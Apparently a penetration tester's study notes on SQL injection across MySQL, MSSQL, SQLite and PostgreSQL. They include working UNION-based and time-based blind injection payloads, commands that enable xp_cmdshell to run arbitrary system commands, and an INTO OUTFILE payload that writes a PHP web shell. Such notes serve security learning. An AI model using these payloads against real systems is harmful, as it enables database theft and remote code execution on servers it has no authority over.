---
layout: blank
---

https://pentestmonkey.net/category/cheat-sheet/sql-injection
### Enumeration/Discovery
- General fuzzing can help, but try to think from the developer's perspective when coming up with the example query
- Matching on numbers may not use single/double quotes at all
	- `SELECT * FROM rooms WHERE room_id = 1;` uses no quotes

### MySQL
- MariaDB is an open-source fork
- `mysql -u {username} -p -h {host IP} -P {port}`
- Specifying multiple parameters `SELECT user, passhash FROM mysql.user WHERE user = '{username}'`
- Enumeration:
	- List all databases: `SELECT * FROM information_schema.tables;`
	- Version: `SELECT @@version;`
	- Current user: `SELECT system_user();`

### MSSQL
- Database management built into Windows
- Command-line tool `SQLCMD` allows SQL queries through cmd
- Kali has `impacket-mssqlclient` to connect to MSSQL databases
	- `impacket-mssqlclient {username}@{host IP} -windows-auth`
		- After opening SQL terminal, can run EXECUTE commands using xp_cmdshell
			- This can be enabled by a user with permissions with 
			- `EXECUTE sp_configure 'show advanced options', 1; 
				- Showing advanced options is actually required to run xp_cmdshell
			- `RECONFIGURE;` 
			- `EXECUTE sp_configure 'xp_cmdshell', 1;`
			- `RECONFIGURE;`
			- Then, pass arbitrary commands with `EXECUTE xp_cmdshell 'whoami';`
	- `-windows-auth` forces the use of NTLM auth (rather than Kerberos)
- List all databases: 
	- `SELECT name FROM sys.databases;`
	- Then, `SELECT * FROM {database name from first query}.information_schema.tables;`
	- This returns the tables within that database, which we can query from with `SELECT * from {database name}.dbo.{table name}`
		- `dbo` is a table schema

### SQLite
- Use `sqlitebrowser` for viewing sqlite databases

### PostgreSQL
- Use `psql` for to connect to PostgreSQL databases

### SQL Exploitation
- Techniques:
	- Can trail SQL injection queries with `//` to provide visibility on the payload and protect against whitespace truncation
	- Can use `IN` to inject arbitrary second command:
		- `' OR 1=1 IN (SELECT version()) -- //`
		- `' OR 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`
- Enumerating tables
	- `' UNION SELECT table_name FROM information_schema.tables -- //`
	- `' UNION SELECT column_name FROM information_schema.columns WHERE table='{table_name} -- //`
- UNION-based Payloads
	- UNION query must include same number of columns as original
		- To find number of columns, use ORDER BY
			- `' ORDER BY 1 -- //`
			- Orders results by a specific column, so it will fail when selected column doesn't exist (iterate through column numbers to find max columns)
		- Can also do `' UNION SELECT null, null, null, ...` until no error
		- If we make the original input invalid, then pass a valid union select, we can see where each piece of data ends up
			- `9999 union select 1,2,3,4,5`
	- Data types need to be compatible between each column
	- E.g. `$query = "SELECT * FROM customers WHERE name LIKE '".$_POST["input"]."%'";`
		- Used `' ORDER BY 5 -- //` and `' ORDER BY 6 -- //` to determine 5 columns
		- Thus payload becomes `%' UNION SELECT null, null, database(), user(), @@version -- //`, filling unneeded columns (including ID column 1) with null
- Blind injection
	- Can use booleans alongside sleep commands to verify existence of data/characters
		- `' AND IF (1=1, sleep(3), 'false') -- //` 
- MySQL RCE via SQLi
	- Use the `INTO OUTFILE` to create a PHP/JSP/ASPX/etc shell
		- Example: `' UNION SELECT "<?php system('whoami');?>", null, null INTO OUTFILE "/var/www/html/tmp/shell.php" -- // `
			- `tmp` is important, because we might not have perms for `/html`
		- Then, either LFI the new file or straight up access it if possible
	- Can also extract users/passwords and crack hashes
	- Could search up phpmyadmin version to get RCE (LFI + session cookie can lead to RCE)
